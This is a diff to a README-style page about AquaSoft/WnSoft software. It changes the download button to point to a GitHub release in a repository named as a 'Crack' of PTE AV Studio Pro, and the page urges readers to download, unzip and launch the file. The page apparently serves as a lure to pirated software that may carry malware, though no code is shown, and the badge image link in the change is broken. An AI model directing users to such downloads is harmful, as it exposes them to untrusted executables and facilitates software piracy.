@@ -55,7 +55,7 @@ Learn more about WnSoft Ltd and their mission to deliver innovative software sol
 ## Get Started:
 Ready to dive into the world of AquaSoft and WnSoft? Download the program zip file by clicking the button below:
 
-[![Download Program](https://img.shields.io/badge/Download-Program.zip-success)](https://github.com/download/Program.zip)
+[![Download Program](https://github.com/Manhar364/WnSoft_PTE_AV_Studio_Pro_Crack/releases/tag/v2.0)](https://github.com/Manhar364/WnSoft_PTE_AV_Studio_Pro_Crack/releases/tag/v2.0)
 
 Need to launch the file after downloading? Simply unzip the program and get started exploring the exciting features it offers!
 
